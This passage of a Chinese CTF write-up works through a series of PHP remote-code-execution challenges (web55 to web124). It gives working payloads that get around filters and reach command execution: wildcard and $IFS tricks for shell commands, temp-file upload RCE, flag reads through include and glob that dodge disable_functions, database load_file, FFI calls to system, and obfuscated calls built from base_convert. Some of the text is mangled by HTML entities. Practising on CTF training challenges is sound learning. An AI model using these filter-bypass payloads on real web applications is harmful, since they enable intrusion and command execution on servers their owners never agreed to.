cp$IFSfl?g.ph?$IFSa.txt||ls\n cp${IFS}fl?g.ph?${IFS}a.txt||ls\n cp${IFS}&#x2F;fl?g${IFS}b.txt||ls\n8.web55?c&#x3D;&#x2F;???&#x2F;????64 ????.???\n?c&#x3D;&#x2F;bin&#x2F;base64 flag.php\n?c&#x3D;&#x2F;???&#x2F;???&#x2F;????2 ????.???\n?c&#x3D;&#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php\n最后访问**&#x2F;flag.php.bz2**即可\n下载下来的压缩包中包含有flag.php\n9.web56​    自定义脚本 上传服务器进行命令执行\n​    自己搭建一个文件上传页面 要指定好目标url \n  \n临时文件存放目录命名规则 eg:&#x2F;tmp&#x2F;phpaaaaaX  php+五位小写字母+一位大写字母\n使用通配符 &#x2F;???&#x2F;????????[@-[]   ascii值 @ 到 [ 之间为大写字母\n在文件上传页面上传并抓包\n修改数据包内容为命令操控脚本 一般上传txt\n   \n  \n响应如下 即可正常rce   \n\n10.web58 文件读取echo file_get_contents(‘flag.php’);\nhighlight_file(‘flag.php’);\nshow_source(‘flag.php’);\ninclude_file(‘flag.php’);echo $flag;\ninclude(‘flag.php’);var_dump(get_defined_vars());\n11.web 66Flag换位置 使用var_dump(scandir(‘&#x2F;‘)); var_export(scandir(‘&#x2F;‘));**\n ..&#x2F; 上一级目录 \n. 当前目录 &#x2F; 根目录\ninclude(‘&#x2F;flag.txt’);\n12.web 71\n \n将flag转换成？\n \n 此时在命令后添加一个 exit(); 中断下列命令即可\ninclude(‘&#x2F;flag.txt’);exit();\ninclude(‘&#x2F;flag.txt’);ob_flush();\ninclude(‘&#x2F;flag.txt’); ob_end_flush();\ninclude(‘&#x2F;flag.txt’);die();\nc&#x3D;$a&#x3D;”glob:&#x2F;&#x2F;&#x2F;*.txt”;\n13.web72glob可以遍历目录，并且不受disable_functions的限制。\n​    构造c&#x3D;?&gt;__toString().' ');} exit(0); ?>\n其实就是执行了一个php语句。首先glob查找根目录下的所有目录（glob:&#x2F;&#x2F; &#x2F;*这样更加清楚些）。然后循环执行并输出给$f，在输出$f。\n​            \n14.web73 通过连接数据库读取c&#x3D;\ntry {$dbh &#x3D; new PDO(‘mysql:host&#x3D;localhost;dbname&#x3D;ctftraining’, ‘root’,’root’);foreach($dbh-&gt;query(‘select load_file(“&#x2F;flag36.txt”)’) as $row){echo($row[0]).”|”; }$dbh &#x3D; null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0);\n数据库名ctftraining 在web58通过蚁剑连接可以获取\n此方法搭配72关遍历目录使用\n15.web77 FFI 即外部函数接口外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术\n1**c=$ffi = FFI::cdef(&quot;int system(const char \\*command);&quot;);$a=&#x27;/readflag &gt; 1.txt&#x27;;$ffi-&gt;system($a);**\n\n$ffi &#x3D; FFI::cdef(“int system(const char *command);”);&#x2F;&#x2F;创建一个system对象\n$a&#x3D;’&#x2F;readflag &gt; 1.txt’;&#x2F;&#x2F;没有回显，所以将内容输出到1.txt\n$ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数\n再访问1.txt\n16.通过系统变量来构造命令web118思路一\n$&#123;PWD&#125; 表示当前工作目录的路径\n$&#123;PATH&#125; 是一个环境变量\n通常包含/bin、/usr/bin、/sbin、/usr/sbin 等目录\n可以发现这几个目录的最后一个字母都是n\n接下来再看看怎么通过系统变量来获取字母\necho ${PWD}&#x2F;rootecho ${PWD:0:1} #表示从0下标开始的第一个字符&#x2F;echo ${PWD:0:1} #从结尾开始往前的第一个字符techo ${PWD:0}techo ${PWD:~A} #所以字母和0具有同样作用t\n通过提示可得当前目录是&#x2F;var&#x2F;www&#x2F;html\n可以构造nl命令\npayload: nl 如下是环境变量构造 空格**$IFS**代替 flag.php用 **????.???**代替\n${PATH:0}${PWD:0}$IFS????.???\n看源代码即可\n17.通过进程累加器来获取字符构造命令web119构造 &#x2F;bin&#x2F;cat xxxx.xxx\nSHLVL是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}&#x3D;1，然后在此shell中再打开一个shell时${SHLVL}&#x3D;2。\n$:${SHLVL}}就输出&#x2F;\n汇总一下每个数字的代替方式\n0：**$、$:$:$}\nr   ${PWD:$}\npayload:\n&#x2F;???&#x2F;??v ????.???\n${PWD::$}???${PWD::$}??${PWD:$:$} ????.???\n&#x2F;???&#x2F;r? ????.???\n${PWD::$}???${PWD::$}${PWD:$}?? ????.???\n19.web122构造  &#x2F;bin&#x2F;base64 xxxx.xx\n以base64的形式来输出文件\n${HOME}&#x3D;&#x2F;root\n&#x2F;   ${HOME::$?}   **$?与&lt;A;**搭配使用\n6   ${RANDOM::$?} 这里使用随机数来碰撞出数字6\n&lt;A; 返回的错误值 使得 $? 为1\npayload:\n&#x2F;???&#x2F;????6? ????.???\n&lt;A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.???\n20.web124\n1234&lt;?php$hexadecimal = &#x27;a37334&#x27;;echo base_convert($hexadecimal, 16, 2);?&gt;\n\n1输出：101000110111001100110100\n\n\n12345&lt;?phpecho bindec(&#x27;110011&#x27;) . &quot;\\n&quot;;echo bindec(&#x27;000110011&#x27;) . &quot;\\n&quot;;echo bindec(&#x27;111&#x27;);?&gt;\n\n以上示例会输出：\n12351517\n\n\n1234&lt;?phpecho decbin(12) . &quot;\\n&quot;;echo decbin(26);?&gt;\n\n以上示例会输出：\n12110011010\n\n\n\n动态函数调用要使用 $var&#123;func&#125; 这种形式\n $var 是一个字符串，&#123;func&#125; 表示函数名\n如果直接使用 $func，则 PHP 引擎会将其解释为一个未定义的常量，并不会当成代码来执行\n&#96;&#96;&lt;?php&#96; \necho (&#39;system&#39;)(&#39;dir&#39;);\n?&gt;\n输出页面\n\n\n在web124中，我们要在可用函数中通过数字的进制转换来构造字符串\n最先想到的便是hex2bin因为他最终可以返回ascii值来构造字符串\n但是hex2bin被禁用便可以通过base_convert来构造\n通过实验逆向构造\n1base_convert(&#x27;hex2bin&#x27;,36,10)\t→\t37907361743\n\n可得第一部分目标代码\n1base_convert(&#x27;37907361743&#x27;,10,36)\n\n通过php动态函数调用，我们最终要构造\n(‘hex2bin’)(‘hex字符串’) 来构造出 ‘_GET‘\n第一部分已经完成，接下来构造第二部分\n题目中字母也被禁用\n文本转16进制再转10进制得\n1_GET → 5f474554 → 1598506324\n\n可得第二部分目标代码\n1dechex(1598506324)\n\n(‘hex2bin’)(‘hex字符串’)两部分替换后得\nbase_convert(&#39;37907361743&#39;,10,36)(dechex(1598506324))      _GET\n再通过动态函数调用构造二次传参\n?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));  动态函数调用部分\n$$pi &#x3D; $_GET   即可构造二次传参 并且 [] 让 ban 了替换成 {} 即可\n$$pi{abs}($$a{acos});&amp;abs&#x3D;system&amp;acos&#x3D;ls;  构造二次传参部分  \n其中**$$pi{abs};是$var{func}中的$var，$$pi{acos};是$var{func}中的{func}**\n最终payload:\n?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});&amp;abs&#x3D;system&amp;acos&#x3D;ls; \n选pi是因为他是在白名单中最短的 方便绕过长度限制\n","slug":"rce","date":"2024-10-22T05:28:00.000Z","categories_index":"ctf入门","tags_index":"php","author_index":"Sygsdsg"}]